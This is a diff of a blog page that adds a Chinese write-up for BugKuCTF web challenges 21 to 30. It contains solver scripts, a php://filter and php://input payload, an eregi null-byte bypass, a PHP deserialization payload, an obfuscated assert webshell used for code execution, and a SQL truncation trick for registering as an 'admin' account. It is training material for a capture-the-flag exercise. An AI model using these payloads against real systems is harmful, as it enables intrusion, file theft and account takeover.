+<p>方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）</p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-BugKuCTF—分析题 第1-9关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -3000,9 +2822,386 @@ if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){
 
 
   
+    <article id="post-BugKuCTF—Web题 第21-30关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="knlvre.github.io/2019/03/28/BugKuCTF—Web题 第21-30关/">BugKuCTF — Web题(第21-30关)</a>
+    </h1>
+  
+
+        
+        <a href="knlvre.github.io/2019/03/28/BugKuCTF—Web题 第21-30关/" class="archive-article-date">
+  	<time datetime="2019-03-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/08/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
+<h3 id="第二十一关（秋名山老司机）"><a href="#第二十一关（秋名山老司机）" class="headerlink" title="第二十一关（秋名山老司机）"></a>第二十一关（秋名山老司机）</h3><p>题目打开要求我们2秒内快速计算</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-1.png" alt="2-1"></p>
+<p>就想到用Python的Session机制，思想是：<code>自动抓取页面、计算、提交、保存Session、显示flag</code></p>
+<p>那此时就会碰到一个问题，我们计算好的值，同哪个变量提交给服务器？</p>
+<p>此时，页面多刷新几次，机会看到提示：<code>value</code>变量</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-2.png" alt="2-2"></p>
+<p>-写代码：</p>
+<pre><code class="python">import requests
+import re
+from bs4 import BeautifulSoup
+
+a = requests.Session()
+url = &#39;http://123.206.87.240:8002/qiumingshan/&#39;
+b = a.get(url)
+soup = BeautifulSoup(b.text,&#39;lxml&#39;)
+c = str(re.findall(&#39;&lt;div&gt;(.*)&lt;/div&gt;&#39;,str(soup.find_all(&#39;div&#39;))))[2:-5]
+result = eval(c)
+data = {&#39;value&#39;:result}
+d = a.post(url,data)
+print(d.text)
+</code></pre>
+<p>多执行几次，flag就跳出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-3.png" alt="1-3"></p>
+<p>为什么要多执行几次呢？看了别人的WP：当计算结果超出一定长度时，服务器就不响应了。在此猜想：可能客户端 Python 脚本计算错误，也可能服务器端 PHP 脚本对大数计算有误差，还可能在 POST 请求过程中令大整数发生改变。至于是哪种，还请高手解答。</p>
+<h3 id="第二十二关（速度要快）"><a href="#第二十二关（速度要快）" class="headerlink" title="第二十二关（速度要快）"></a>第二十二关（速度要快）</h3><p>题目进去提示：<code>我感觉你得快点!!!</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-1.png" alt="2-1"></p>
+<p>查看源代码：<code>margin</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-2.png" alt="2-2"></p>
+<p>使用<code>Burpsuits</code>发送GET请求包，返回的内容里有flag字段，是<code>Base64加密</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-3.png" alt="2-3"></p>
+<p>拿去Notepad++解密一下，还是经过<code>Base64加密</code>，需要再次解密才会变成数字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-4.png" alt="2-4"></p>
+<p>那么现在这个数字应该就是我们要的值，并且作为变量<code>margin</code>的值提交上去才行</p>
+<p>写代码：</p>
+<pre><code class="python">import base64,requests
+
+a = requests.Session()
+url = &quot;http://123.206.87.240:8002/web6/&quot;
+b = a.get(url)
+b = b.headers[&#39;flag&#39;]
+c = str(base64.b64decode(b))[-9:-1]
+d = base64.b64decode(c)
+result = d.decode()
+data = {&#39;margin&#39;:result}
+
+flag = a.post(url,data=data)
+print(flag.text)
+</code></pre>
+<p>直接拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-5.png" alt="2-5"></p>
+<h3 id="第二十三关（Cookies欺骗）"><a href="#第二十三关（Cookies欺骗）" class="headerlink" title="第二十三关（Cookies欺骗）"></a>第二十三关（Cookies欺骗）</h3><p>链接进去后只看到一串一直重复的文字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-1.png" alt="3-1"></p>
+<p>但是注意到<code>URL</code>的<code>filename</code>字段后面接的是<code>Base64</code>密文，拿去解密一下是：<code>key.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-2.png" alt="3-2"></p>
+<p>我们将<code>index.php</code>也经过<code>Base64</code>加密，放上去，然后将<code>line</code>参数调成1。嗯？有料</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-3.png" alt="3-3"></p>
+<p>调成2、3试一下，也都有内容</p>
+<p>那就直接写个脚本全部抓下来看</p>
+<pre><code class="python">import requests,base64
+
+s = &quot;index.php&quot;
+s = s.encode()
+s = base64.b64encode(s)
+s = s.decode()
+
+for i in range(30):
+    i = str(i)
+    url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot; + i + &quot;&amp;filename=&quot; + s
+    r = requests.get(url)
+
+    if(r.text):
+        print(r.text[0:-2])
+    else:
+        break
+</code></pre>
+<p>读取如下内容：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);
+$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;
+if($file==&#39;&#39;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);
+$file_list = array(
+&#39;0&#39; =&gt;&#39;keys.txt&#39;,
+&#39;1&#39; =&gt;&#39;index.php&#39;,
+);
+
+if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;){
+$file_list[2]=&#39;keys.php&#39;;
+}
+
+if(in_array($file, $file_list)){
+$fa = file($file);
+echo $fa[$line];
+}
+?&gt;
+</code></pre>
+<p>关于<code>问号（?）</code>的用法：</p>
+<pre><code>[表达式] ? [结果1]:[结果2]        //当表达式为True时，返回结果1;当表达式为False时，返回结果2
+</code></pre><p>所以当<code>Cookie</code>中有<code>margin</code>，并且<code>file</code>的值为<code>keys.php的Base64密文</code>时，返回<code>keys.php</code>的值</p>
+<p><code>Burpsuits</code>提交，成功获得<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-5.png" alt="3-5"></p>
+<h3 id="第二十四关（Never-give-up）"><a href="#第二十四关（Never-give-up）" class="headerlink" title="第二十四关（Never give up）"></a>第二十四关（Never give up）</h3><p>链接进去没有提示有用的信息，只显示”never never never give up !!!”</p>
+<p>右键”查看网页源代码”，看到提示信息<code>&lt;!--1p.html--&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-1.png" alt="4-1"></p>
+<p>我们直接在<code>view-source</code>的后面改成<code>1p.html</code>就可以看到内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-2.png" alt="4-2"></p>
+<p>内容显然是经过<code>url编码</code>和<code>Base64加密</code>的，那就直接复制到<code>Notepad++</code>里进行转换</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-3.png" alt="4-3"></p>
+<p>对其中几个函数解释一下：</p>
+<pre><code>stripos()：
+函数查找字符串在另一字符串中第一次出现的位置（不区分大小写），返回一个数字
+
+eregi()：
+用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则返回false
+和 ereg() 完全相同，只除了在匹配字母字符时忽略大小写的区别
+</code></pre><p>开始对源码中<code>$id</code>、<code>$a</code>、<code>$b</code> 三个变量需要满足的条件进行讲解</p>
+<p>一、$id（弱类型比较）</p>
+<p>变量 $id 若想满足非空非零，且弱等于整型数 0，则 $id 的值只能为非空非零字符串</p>
+<p>我们随便设置一个值：$id=bugku，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-4.png" alt="4-4"></p>
+<p>二、$a（PHP伪协议）</p>
+<p>源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流</p>
+<p>在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。因此这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input可以访问原始请求数据中的只读流。这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!</p>
+<p>三、$b（eregi()截断漏洞）</p>
+<p>CTF 题做多了就知道 ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。这个漏洞可以用<code>url中空格的编码</code>：<code>%00</code>来绕过</p>
+<p>源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “%00”，即eregi(“111”,”1114”)，满足 “111”去匹配 “1114” 成功。因此，这里假设 $b = “%0012345”，才能满足以上三个条件</p>
+<p>构造<code>payload</code>：</p>
+<pre><code>?id=Bugku&amp;&amp;a=php://input&amp;&amp;b=%0012345
+
+//请求主体中提交字符串：bugku is a nice plateform!
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-5.png" alt="4-5"></p>
+<p>成功拿下flag</p>
+<p>不过此题还有一个更简单的做法。。。。</p>
+<p>直接访问<code>f4l2a3g.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-6.png" alt="4-6"></p>
+<h3 id="第二十五关（welcome-to-bugkuctf）"><a href="#第二十五关（welcome-to-bugkuctf）" class="headerlink" title="第二十五关（welcome to bugkuctf）"></a>第二十五关（welcome to bugkuctf）</h3><p>链接进去没有提示有用信息，只是提示：”you are not the number of bugku !”</p>
+<p>查看源代码，看到了提示</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-1.png" alt="5-1"></p>
+<p>看到<code>file_get_contents()</code>和<code>include()</code>想到之前的知识点，构造<code>payload</code>：</p>
+<pre><code>?txt=php://&amp;&amp;file=php://filter/read=convert.base64-encode//resource=hint.php
+
+//password变量好像暂时用不上，就先不传入了
+//请求主体中提交字符串：welcome to the bugkuctf
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-2.png" alt="5-2"></p>
+<p>将那串<code>Base64</code>拿去解码，得到如下内容</p>
+<pre><code class="php">&lt;?php  
+
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;good&quot;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre>
+<p>现在，直接将<code>$file</code>变量改成<code>flag.php</code>是不行的，会返回一串乱码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-4.png" alt="5-4"></p>
+<p>没有思路后看别人的WriteUp，我们就按照之前的步骤看<code>index.php</code>的源代码</p>
+<p>为什么是<code>index.php</code>呢</p>
+<p>第一：因为这个页面通常是一个网站的关键页面，有重要信息</p>
+<p>第二：在我们给<code>$file</code>变量添加内容后，返回<code>hello friend!</code>，在其他源代码没见过，所以可以猜测有其他内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-5.png" alt="5-5"></p>
+<p>把获得的<code>Base64密文</code>拿去解密得到代码</p>
+<pre><code class="php">&lt;?php  
+$txt = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$password = $_GET[&quot;password&quot;];  
+
+if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello friend!&lt;br&gt;&quot;;  
+    if(preg_match(&quot;/flag/&quot;,$file)){ 
+        echo &quot;不能现在就给你flag哦&quot;;
+        exit();  
+    }else{  
+        include($file);   
+        $password = unserialize($password);  
+        echo $password;  
+    }  
+}else{  
+    echo &quot;you are not the number of bugku ! &quot;;  
+}  
+
+?&gt;
+</code></pre>
+<p>观察代码，在第八行时利用了正则匹配，当检测到<code>$file</code>变量中含有<code>flag</code>关键字，返回<code>不能现在就给你flag哦</code>，这应该就是刚才我们得到的乱码。这样的话，$flie变量就不能含有flag才能执行<code>else中的语句</code></p>
+<p>使用<code>include()</code>来处理<code>$file</code>变量，将变量<code>$password</code>进行逆序列化，然后输出<code>$password</code>的值</p>
+<p>回到通过<code>hint.php</code>获得的代码块，<code>Flag类</code>，看到里面有一个$file属性，并且有一个魔术方法<code>_tostring()</code>，这个方法的作用就是当调用实例化对象时就会自动执行<code>_tostring()</code>这个方法。简单来说创造一个这个类的对象就会调用这个方法。而在<code>_tostring()</code>中，会输出以字符串的形式输出<code>$file</code>，根据上面的这些条件，我们可以让$password为<code>Flag</code>类型，并且让FLAG中的$file就等于flag.php，这样我们就可以得到flag.php的内容了，不过要记得，前面$password进行了反序列化的操作，所以我们要先把它序列化。在本地写一个php脚本，来获取<code>$password</code>的值：</p>
+<pre><code class="php">&lt;?php
+class Flag{
+    public $file;
+}
+
+$test = new Flag;
+$test-&gt;file = &#39;flag.php&#39;;
+echo serialize($test);
+?&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-7.png" alt="5-7"></p>
+<p>现在构造<code>payload</code>：</p>
+<p>这里<code>$file</code>要记得填<code>hint.php</code>，要将这个包含进来才可以，改成其他的会失败，因为失去Flag类</p>
+<pre><code>?txt=php://input&amp;&amp;file=hint.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre><p>通过Burpsuits提交，得到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-8.png" alt="5-8"></p>
+<h3 id="第二十六关（过狗一句话）"><a href="#第二十六关（过狗一句话）" class="headerlink" title="第二十六关（过狗一句话）"></a>第二十六关（过狗一句话）</h3><p>有提示：</p>
+<pre><code class="php">&lt;?php 
+    $poc=&quot;a#s#s#e#r#t&quot;; 
+    $poc_1=explode(&quot;#&quot;,$poc); 
+    $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
+    $poc_2($_GET[&#39;s&#39;]) 
+?&gt;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-1.png" alt="6-1"></p>
+<p>可以看出<code>$poc_2=assert</code>，也就是<code>$poc_2($_GET[&#39;s&#39;])</code>  = <code>assert($_GET[&#39;s&#39;])</code></p>
+<p>可以利用<code>assert()</code>函数存在<code>代码执行漏洞</code></p>
+<p>数组形式返回当前目录下的文件：</p>
+<pre><code class="php">?s=print_r(scandir(&#39;./&#39;))
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-2.png" alt="6-2"></p>
+<p>注意到其中的一个文件：<code>flag_sm1skla1.txt</code></p>
+<p>直接访问，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-3.png" alt="6-3"></p>
+<h4 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h4><p>可以继续利用这个漏洞，读取其他任意想要读取的文件</p>
+<p>读取上一级目录：</p>
+<pre><code>?s=print_r(scandir(&#39;../&#39;))
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-4.png" alt="6-4"></p>
+<h3 id="第二十七关（字符？正则？）"><a href="#第二十七关（字符？正则？）" class="headerlink" title="第二十七关（字符？正则？）"></a>第二十七关（字符？正则？）</h3><p>链接进去直接看到代码，如下：</p>
+<pre><code class="php">&lt;?php 
+highlight_file(&#39;2.php&#39;);
+$key=&#39;KEY{********************************}&#39;;
+$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+if( $IM ){ 
+  die(&#39;key is: &#39;.$key);
+}
+?&gt;
+</code></pre>
+<p>分析一下：</p>
+<pre><code>简单复习一下preg_match()：
+preg_match(string $pattern , string $subject , array $matches)
+
+pattern
+要搜索的模式，字符串类型。
+
+subject
+输入字符串。
+
+matches
+如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。
+</code></pre><pre><code>模式的解释：
+1.表达式直接写出来的字符串直接利用，如key
+2.“.”：代表任意字符
+3.“*”：代表一个或一序列字符重复出现的次数，即前一个字符重复任意次
+4.“\/”：代表“/”
+5.[a-z]：代表a-z中的任意一个字符
+6.[[:punct:]]：代表任意一个各种符号
+7./i：代表大小写不敏感
+8.{4,7}：代表前一个字符，连续出现的次数是4-7次就可以
+</code></pre><p>这样我们就可以的出我们的<code>id</code>的有效值：</p>
+<pre><code>?id=key999key9999key:/9/999keya!
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/7-1.png" alt="7-1"></p>
+<h3 id="第二十八关（前女友-SKCTF-）"><a href="#第二十八关（前女友-SKCTF-）" class="headerlink" title="第二十八关（前女友(SKCTF)）"></a>第二十八关（前女友(SKCTF)）</h3><p>链接打不开，先放着吧</p>
+<h3 id="第二十九关（login1-SKCTF-）"><a href="#第二十九关（login1-SKCTF-）" class="headerlink" title="第二十九关（login1(SKCTF)）"></a>第二十九关（login1(SKCTF)）</h3><p>题目有提示：SQL约束攻击</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-1.png" alt="9-1"></p>
+<p>链接进去后点击”没有账号”，随便注册一个账号。返回登陆时，提示我们”不是管理员还想看flag?!”</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-2.png" alt="9-2"></p>
+<p>那也就是提示我们，管理员才能看flag，那怎么通过管理员的身份去查看flag呢？注册一个管理员账号</p>
+<p>参考博客：<a href="https://blog.csdn.net/qq_42777804/article/details/81866940" target="_blank" rel="noopener">第二十九关WriteUp</a></p>
+<p>首先先说一下<code>SQL约束攻击</code>：</p>
+<ol>
+<li>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说<code>&quot;admin&quot;</code>等同于<code>&quot;admin   &quot;</code>，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的</li>
+</ol>
+<pre><code>select * from user where username=&#39;admin   &#39;;
+</code></pre><ol start="2">
+<li>在所有的<code>INSERT</code>查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“abcdefg”时，实际上只能插入字符串的前5个字符，即“abcde”</li>
+</ol>
+<p>知道条件的时候，我们就去注册一个账号，用户名为<code>&#39;admin     &#39;</code>（后面接5个空格，空格数量随意），密码符合条件随意就行</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-3.png" alt="9-3"></p>
+<p>然后直接用这个账号去登陆，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-4.png" alt="9-4"></p>
+<p>也就是说，<code>注册</code>时使用<code>INSERT语句</code>帮我们插入一个用户名为<code>&#39;admin     &#39;</code>的账户</p>
+<p><code>登陆</code>时，帮我们删掉了用户名后面的空格，即查询了<code>&#39;admin&#39;</code>用户的信息</p>
+<h3 id="第三十关（你从哪里来）"><a href="#第三十关（你从哪里来）" class="headerlink" title="第三十关（你从哪里来）"></a>第三十关（你从哪里来）</h3><p>链接打开看到提示：<code>&quot;are you from google?&quot;</code></p>
+<p>那么这关考察的是<code>Http Referer</code>：</p>
+<ol>
+<li><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站</p>
+</li>
+<li><p>Referer的正确英语拼法是referrer。由于早期HTTP规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以目前拼法不统一</p>
+</li>
+</ol>
+<p>我们可以自己测试一下，打开<code>https://www.baidu.com</code>，挂上<code>Burpsuits</code>的代理，随便点击一个可点链接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-1.png" alt="10-1"></p>
+<p>看一下Burpsuit中请求头里长什么样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-2.png" alt="10-2"></p>
+<p>果然是有<code>Referer</code>字段的，并且其内容是<code>https://www.baidu.com</code>，这就验证了我们的说法</p>
+<p>那现在开始做题。将请求头加上<code>Referer</code>字段，内容为<code>https://www.google.com</code>，拿下flag</p>
+<pre><code>Referer: https://www.google.com
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/10-3.png" alt="10-3"></p>
+<hr>
+<p>至此，21-30关的Write-up结束</p>
+<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/04/10/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="knlvre.github.io/2019/03/28/BugKuCTF—Web题 第21-30关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="knlvre.github.io/page/2/">&laquo; Prev</a><a class="page-number" href="knlvre.github.io/">1</a><a class="page-number" href="knlvre.github.io/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="knlvre.github.io/page/4/">4</a><a class="page-number" href="knlvre.github.io/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="knlvre.github.io/page/7/">7</a><a class="extend next" rel="next" href="knlvre.github.io/page/4/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="knlvre.github.io/page/2/">&laquo; Prev</a><a class="page-number" href="knlvre.github.io/">1</a><a class="page-number" href="knlvre.github.io/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="knlvre.github.io/page/4/">4</a><a class="page-number" href="knlvre.github.io/page/5/">5</a><a class="page-number" href="knlvre.github.io/page/6/">6</a><a class="extend next" rel="next" href="knlvre.github.io/page/4/">Next &raquo;</a>
     </nav>
   
 
@@ -3035,7 +3234,7 @@ if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){
 		toc_hide_index: true,
 		root: "knlvre.github.io/",
 		innerArchive: true,
-		showTags: false
+		showTags: true
 	}
 </script>
 
